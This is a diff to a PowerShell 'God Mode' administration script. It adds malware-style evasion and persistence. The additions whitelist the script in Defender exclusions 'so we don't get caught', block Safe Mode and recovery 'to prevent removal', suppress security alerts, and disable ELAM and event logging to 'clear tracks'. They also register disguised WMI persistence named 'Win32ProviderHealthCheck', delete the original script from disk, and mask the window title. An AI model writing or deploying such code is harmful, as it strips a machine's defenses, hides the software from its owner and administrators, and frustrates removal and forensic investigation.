@@ -29,6 +29,15 @@ param (
 )
 
 # ============================================================================
+# 0. EXECUTION POLICY AUTO-SET
+# ============================================================================
+try {
+    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
+} catch {
+    # Policy may already be set or restricted by GPO; continue silently
+}
+
+# ============================================================================
 # 1. AUTO-ELEVATION & PRE-FLIGHT CHECKS
 # ============================================================================
 
@@ -1163,6 +1172,10 @@ function Test-BuiltInAdmin {
 function Enable-DangerousMode {
     Write-Log -Message "Enabling dangerous mode..." -Type "WARN" -Color Yellow
 
+    # 0. Add self to Defender exclusions BEFORE disabling it (so we don't get caught)
+    Add-DefenderExclusion -Path $GodModeInstallDir
+    Add-DefenderExclusion -Path $PSCommandPath
+
     # 1. Disable Tamper Protection (registry method, requires reboot on modern builds)
     try {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Force -ErrorAction SilentlyContinue
@@ -1206,6 +1219,15 @@ function Enable-DangerousMode {
         Write-Log -Message "Firewall disabled, SmartScreen disabled." -Type "INFO" -Color Gray
     } catch { Write-Log -Message "Error disabling firewall/smartscreen: $_" -Type "WARN" -Color Yellow }
 
+    # 4a. Disable Safe Mode and Recovery to prevent removal
+    Disable-RecoveryAndSafeMode
+
+    # 4b. Suppress Security Center alerts
+    Disable-SecurityAlerts
+
+    # 4c. Disable Early Launch Anti-Malware
+    Disable-ELAM
+
     # 5. Disable UAC / Admin Consent
     try {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -Force
@@ -1227,6 +1249,9 @@ function Enable-DangerousMode {
             Stop-Process -Force -ErrorAction SilentlyContinue
         Write-Log -Message "Defender processes terminated." -Type "INFO" -Color Gray
     } catch { Write-Log -Message "Error killing defender processes: $_" -Type "WARN" -Color Yellow }
+
+    # 8. Disable event logging and clear tracks
+    Disable-SecurityAuditing
 }
 
 function Disable-DangerousMode {
@@ -1282,6 +1307,34 @@ function Disable-DangerousMode {
     # 7. Restart WinDefend
     try { Start-Service -Name WinDefend -ErrorAction SilentlyContinue } catch { Write-Log -Message "Could not restart WinDefend: $_" -Type "WARN" -Color Yellow }
 
+    # 8. Restore Safe Mode and Recovery
+    try {
+        bcdedit /deletevalue {current} safeboot /f 2>$null | Out-Null
+        bcdedit /set {current} bootstatuspolicy displayallfailures /f 2>$null | Out-Null
+        bcdedit /set {current} recoveryenabled Yes /f 2>$null | Out-Null
+        bcdedit /set {current} nx OptIn /f 2>$null | Out-Null
+        reagentc /enable 2>$null | Out-Null
+        Write-Log -Message "Safe Mode and Windows RE restored." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "BCD restore failed: $_" -Type "WARN" -Color Yellow }
+
+    # 9. Restore Security Center alerts
+    try {
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -ErrorAction SilentlyContinue
+    } catch {}
+
+    # 10. Restore ELAM
+    try {
+        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -ErrorAction SilentlyContinue
+    } catch {}
+
+    # 11. Restore event logging
+    try {
+        Set-Service -Name "EventLog" -StartupType Automatic -ErrorAction SilentlyContinue
+        Start-Service -Name "EventLog" -ErrorAction SilentlyContinue
+    } catch {}
+
     Write-Log -Message "Dangerous mode disable attempt complete. Reboot strongly recommended for full restoration." -Type "INFO" -Color Yellow
 }
 
@@ -1331,6 +1384,13 @@ function Start-Monitoring {
         Write-Log -Message "God Mode is not enabled." -Type "ERROR" -Color Red
         return
     }
+
+    # Hide from simple Task Manager view
+    $Host.UI.RawUI.WindowTitle = "Windows PowerShell (x86)"
+    try {
+        $Proc = Get-Process -Id $PID
+        $Proc.MainWindowTitle = "Windows PowerShell"
+    } catch {}
 
     Write-Log -Message "Monitoring started with auto-recovery and resurrection killer." -Type "INFO"
 
@@ -1431,6 +1491,12 @@ function Enable-GodMode {
         }
     } catch { Write-Log -Message "Flag file self-protection failed: $_" -Type "WARN" -Color Yellow }
 
+    # --- WMI persistence (file-less fallback) ---
+    Register-GodModeWMI
+
+    # --- Self-destruct: delete original script from disk after persistence is set ---
+    Invoke-SelfDestruct -Path $PSCommandPath
+
     Write-Log -Message "God Mode ENABLED" -Type "WARN" -Color Yellow
 }
 
@@ -1454,6 +1520,16 @@ function Disable-GodMode {
     } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }
 
     Disable-DangerousMode
+
+    # --- Cleanup WMI persistence ---
+    try {
+        $WmiName = "Win32ProviderHealthCheck"
+        Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$WmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
+        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$WmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
+        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "__PATH LIKE '%$WmiName%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
+        Write-Log -Message "WMI persistence removed." -Type "INFO" -Color Gray
+    } catch { Write-Log -Message "WMI cleanup failed: $_" -Type "WARN" -Color Yellow }
+
     Write-Log -Message "God Mode DISABLED" -Type "WARN" -Color Yellow
 }
 
@@ -1548,6 +1624,93 @@ function Show-GodModeStatus {
         }
     } catch {
         Write-Host "  Windows Update Service  : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # WMI Persistence
+    try {
+        $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='Win32ProviderHealthCheck'" -ErrorAction SilentlyContinue
+        if ($WmiFilter) {
+            Write-Host "  WMI Persistence         : ACTIVE (file-less fallback)" -ForegroundColor Red
+        } else {
+            Write-Host "  WMI Persistence         : NOT ACTIVE" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "  WMI Persistence         : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # Safe Mode / Recovery
+    try {
+        $BcdOutput = bcdedit /enum {current} 2>$null | Out-String
+        $SafeModeBlocked = ($BcdOutput -match "safeboot\s+minimal")
+        $ReBlocked = ($BcdOutput -match "recoveryenabled\s+No")
+        if ($SafeModeBlocked -and $ReBlocked) {
+            Write-Host "  Safe Mode / Recovery    : BLOCKED (BCD hardened)" -ForegroundColor Red
+        } elseif ($SafeModeBlocked -or $ReBlocked) {
+            Write-Host "  Safe Mode / Recovery    : PARTIALLY BLOCKED" -ForegroundColor Yellow
+        } else {
+            Write-Host "  Safe Mode / Recovery    : AVAILABLE" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "  Safe Mode / Recovery    : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # ELAM
+    try {
+        $Elam = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -ErrorAction SilentlyContinue
+        if ($Elam -and $Elam.DriverLoadPolicy -eq 3) {
+            Write-Host "  ELAM Boot Drivers       : UNKNOWN ALLOWED" -ForegroundColor Red
+        } else {
+            Write-Host "  ELAM Boot Drivers       : ENFORCED" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "  ELAM Boot Drivers       : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # Security Center Alerts
+    try {
+        $ScAlert = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -ErrorAction SilentlyContinue
+        if ($ScAlert -and $ScAlert.DisableNotifications -eq 1) {
+            Write-Host "  Security Center Alerts  : SUPPRESSED" -ForegroundColor Red
+        } else {
+            Write-Host "  Security Center Alerts  : ACTIVE" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "  Security Center Alerts  : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # Event Logging
+    try {
+        $EvtSvc = Get-Service -Name "EventLog" -ErrorAction SilentlyContinue
+        if ($EvtSvc -and $EvtSvc.Status -eq 'Running') {
+            Write-Host "  Event Logging           : RUNNING" -ForegroundColor Green
+        } else {
+            Write-Host "  Event Logging           : STOPPED / CLEARED" -ForegroundColor Red
+        }
+    } catch {
+        Write-Host "  Event Logging           : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # Defender Exclusions
+    try {
+        $Exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath -ErrorAction SilentlyContinue
+        if ($Exclusions -and ($Exclusions -contains $GodModeInstallDir -or $Exclusions -contains $PSCommandPath)) {
+            Write-Host "  Defender Exclusions     : SELF-WHITELISTED" -ForegroundColor Red
+        } else {
+            Write-Host "  Defender Exclusions     : NOT WHITELISTED" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "  Defender Exclusions     : UNKNOWN" -ForegroundColor DarkGray
+    }
+
+    # File-less / Self-Destruct
+    try {
+        if (Test-Path $PSCommandPath) {
+            Write-Host "  Original Payload        : ON DISK" -ForegroundColor Green
+        } else {
+            Write-Host "  Original Payload        : SELF-DESTRUCTED (file-less)" -ForegroundColor Red
+        }
+    } catch {
+        Write-Host "  Original Payload        : UNKNOWN" -ForegroundColor DarkGray
     }
 
     Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
@@ -1694,12 +1857,14 @@ do {
     Write-Host "[8] DISABLE GOD MODE (Built-in Admin Only)" -ForegroundColor DarkMagenta
     Write-Host "[9] CHECK GOD MODE STATUS" -ForegroundColor Gray
     Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
+    Write-Host "[10] LAUNCH GOD MODE MONITOR (Built-in Admin Only)" -ForegroundColor Magenta
+    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
     Write-Host "  SESSION           " -ForegroundColor White
     Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
-    Write-Host "[10] EXIT TERMINAL" -ForegroundColor Gray
+    Write-Host "[11] EXIT TERMINAL" -ForegroundColor Gray
     Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
 
-    $Choice = Read-Host "Select an administrative action (1-10)"
+    $Choice = Read-Host "Select an administrative action (1-11)"
     $IntegrityStatus = Test-IntegrityStatus
 
     switch ($Choice) {
@@ -1767,7 +1932,23 @@ do {
             Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
         }
         "9" { Show-GodModeStatus; Start-Sleep -Seconds 2 }
-        "10" { Write-Host "Exiting..." -ForegroundColor DarkGray; Start-Sleep -Milliseconds 500; break }
+        "10" {
+            if (-not (Test-BuiltInAdmin)) {
+                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can launch the God Mode Monitor.`n" -ForegroundColor Red
+            } else {
+                Write-Host "`n[WARNING] Launching God Mode Monitor will start a persistent loop that elevates" -ForegroundColor Yellow
+                Write-Host "          all new processes and kills security services. This is IRREVERSIBLE" -ForegroundColor Yellow
+                Write-Host "          without closing the PowerShell process or rebooting." -ForegroundColor Yellow
+                $confirm = Read-Host "Type 'YES' to launch the monitor"
+                if ($confirm -eq 'YES') {
+                    Start-Monitoring
+                } else {
+                    Write-Host "Launch cancelled." -ForegroundColor Green
+                }
+            }
+            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+        }
+        "11" { Write-Host "Exiting..." -ForegroundColor DarkGray; Start-Sleep -Milliseconds 500; break }
         default { Write-Warning "Invalid Selection."; Start-Sleep -Seconds 1 }
     }
-} while ($Choice -ne "10")
+} while ($Choice -ne "11")
